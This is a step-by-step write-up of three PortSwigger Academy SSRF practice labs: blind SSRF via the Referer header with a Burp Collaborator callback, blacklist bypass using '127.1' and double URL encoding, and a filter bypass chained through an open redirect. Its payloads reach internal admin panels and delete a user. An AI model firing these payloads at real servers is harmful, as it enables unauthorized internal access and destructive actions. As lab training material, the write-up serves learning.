## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Server-side request forgery (SSRF)**:

**3 Blind SSRF with out-of-band detection**  
<blockquote>
This lab demonstrates how to exploit SSRF vulnerabilities that require out-of-band interaction to detect and confirm the attack.
</blockquote>

**4 SSRF with blacklist-based input filter**  
<blockquote>
This lab shows how attackers can bypass blacklist-based filters to exploit SSRF vulnerabilities.
</blockquote>


**5 SSRF with filter bypass via open redirection vulnerability**  
<blockquote>
This lab illustrates how SSRF attacks can bypass filters by leveraging open redirection flaws.
</blockquote>

---

### LAB 3 - Blind SSRF with out-of-band detection

### Lab Description

 ![image](https://github.com/user-attachments/assets/e9bfe812-1c61-49a9-9da1-c3a37202af54)

### Solution


- I accessed the lab and clicked on a product.
- Using **Burp Suite**, I intercepted the HTTP request made when loading the product page.

- The lab description mentioned that the server fetches the URL specified in the `Referer` header when the product page is loaded.
- This hinted at an SSRF vector via the `Referer` header.

#### 1. **Generating a Burp Collaborator Payload**

- I generated a **Burp Collaborator** client payload.
- Then, I replaced the value of the `Referer` header with the Collaborator payload URL:

```http
Referer: http://<your-collaborator-id>.oastify.com
```




#### 2. **Sending the Request**

- I forwarded the modified request to the server.


![image](https://github.com/user-attachments/assets/ab4a3ac1-4343-44c8-9b77-9ca17cc186b7)

#### 3. **Confirming SSRF via Callback**

- The **Collaborator client** received an incoming request, indicating that the server made an outbound request to the payload URL.
- This confirmed the **SSRF vulnerability** in the `Referer` header.

  ![image](https://github.com/user-attachments/assets/277597d4-3fca-4f86-99b5-f0ce13cee7f7)

And thus the lab is solved

![image](https://github.com/user-attachments/assets/46779c91-2192-4676-9b37-4eb6f6b9195a)

---



### LAB 4 - SSRF with blacklist-based input filter

### Lab Description

![image](https://github.com/user-attachments/assets/444b39ef-4ef9-47de-82ee-2295ddc64ed7)


### Solution


### Step-by-Step Solution

#### 1. **Intercepting the Stock Check Request**

- I clicked on a product and intercepted the **Check Stock** functionality using **Burp Suite**.
- The request sent a `stockApi` parameter with a URL for internal stock checking.
- I changed the value of `stockApi` to:

```http
http://localhost
```

![image](https://github.com/user-attachments/assets/1c0a559a-879b-4677-aed5-9cbf0dd83708)

- The application responded with:

External stock check blocked for security reasons

![image](https://github.com/user-attachments/assets/19ecc801-ae08-46fa-9d85-2cbfbf24f561)


- This confirmed the presence of SSRF filtering logic.

#### 2. **Bypassing Using Alternative Loopback IP**

- I tried `http://127.0.0.1` — also blocked.
- Then I tried `http://127.1` — this returned a `200 OK` response **and revealed `/admin`** in the response body.

#### 3. **Attempting Access to the Admin Interface**

- I tried accessing:

```http
http://127.1/admin

```
- But again received the same security error:  


External stock check blocked for security reasons

![image](https://github.com/user-attachments/assets/bfa81771-fba1-486e-a648-f01255cd57d7)


- This meant there was **another layer of filtering**, likely targeting the `/admin` string.


### Bypassing the Second Filter

#### 4. **URL Encoding `/admin`**

- I tried encoding `/admin` as:

```http
/%61%64%6d%69%6e
```

![image](https://github.com/user-attachments/assets/ab2eacd3-532e-48ef-87b3-12fdc9aac291)


But it was still blocked.

#### 5. **Double URL Encoding**

- I encoded `%61%64%6d%69%6e` again to get:

```http

%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

```

- I replaced `/admin` with this double-encoded value:

```http
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

```

- This bypassed the filter and the response revealed the delete user endpoint

```http

/delete?username=carlos

```

![image](https://github.com/user-attachments/assets/501f4568-be0b-48ae-a2d6-5521a6307c8d)

**Informational**

- Or another method I came to knew was using mix characters usage `LoCaLHosT`, this time we are able to bypass ther restriction.

   ![image](https://github.com/user-attachments/assets/13cce578-faa8-440b-ae6c-a3b409c96d56)

  Get `200` response from above request

  ![image](https://github.com/user-attachments/assets/388893d0-58d1-46ea-bb3d-833c9dc6f6fa)

---


#### Final Step – Deleting the User

- I appended the delete endpoint to the request:

```http
  http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```
- I sent the request, and the user `carlos` was deleted.

![image](https://github.com/user-attachments/assets/17f4eb6f-d3ff-4f10-84b2-389c8e92f114)


![image](https://github.com/user-attachments/assets/66af957b-e693-43b2-8091-dd05980bee69)


---

### LAB 5 - SSRF with filter bypass via open redirection vulnerability

### Lab Description

![image](https://github.com/user-attachments/assets/0fc17dde-643a-4f92-84fb-392edb7018db)

### Solution


#### 1. **Initial Attempt – Direct SSRF**

- I intercepted the **Check Stock** request on the product page using **Burp Suite**.
- I attempted to directly access the admin panel via:

 ```http
 http://192.168.0.12:8080/admin 
 ```

- The server returned an error:



Invalid external stock check url 'Invalid URL'

![image](https://github.com/user-attachments/assets/a10a2fd2-09f0-4022-9229-13628aba9d22)



- This confirmed that **direct access was restricted**, as mentioned in the lab description.


### 2. **Searching for Open Redirect**

#### 2.1. **Checked the Stock Check Endpoint**

- I URL-decoded the stock check request:

```http
   /product/stock/check?productId=1&storeId=1
```

- Tried multiple payloads for open redirection on this endpoint — none worked.

![image](https://github.com/user-attachments/assets/525d3565-9ab3-4658-aaf2-c274b073c0da)


#### 2.2. **Explored Product Navigation Links**

- On the product page, I found two buttons:
- **Return to list** – no parameters, no redirect potential.
- **Next product** – had a `path` parameter in the request.

### 2.3. **Confirmed Open Redirect**

- I intercepted the **Next product** request and modified the `path` parameter:

![image](https://github.com/user-attachments/assets/5b0d10c1-1b03-4482-b013-114b1c61a0b8)

- I replaced the path value to  `http://192.168.0.12:8080/admin` and the application got redirected to the same. So, there was an Open Redirection here.

   ![image](https://github.com/user-attachments/assets/253ba0ef-858d-413f-8936-a1128f893a1c)

---

### 3. **Combining SSRF with Open Redirect**

#### 3.1. **Tried Direct Use of Redirect in stockApi**

- Now provide the redirect path `/product/nextProduct?path=http://192.168.0.12:8080/admin` to the stockApi parameter from the full uri `/product/nextProduct?currentProductId=1&path=/product?productId=2`).

We get a `200 OK` response & we can able to access the admin panel.

```http
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

![image](https://github.com/user-attachments/assets/a6f821af-bc5b-4ced-a9ae-5791f496445e)

- The server returned an error again — likely due to encoding issues.

### 3.2. **URL Encoded the Redirect Endpoint**

- I encoded the entire redirect URL:

```http
/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```

- Replaced `stockApi` with the encoded payload.

![image](https://github.com/user-attachments/assets/0c8582ef-1a14-4f7a-8d4a-312adfeafbd6)


#### 3.3. **Success: Admin Interface Accessed**

- This returned a `200 OK` response, along with:

```http
/delete?username=carlos
```


- I appended the delete endpoint to the stockApi:

```http
/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
```
- Sent the request, and the user `carlos` was deleted.

![image](https://github.com/user-attachments/assets/6c1e16a5-4aff-4da7-bd96-06b716e5ce12)

![image](https://github.com/user-attachments/assets/4caa2ba5-e276-46e8-92ea-b9282c961a49)


---

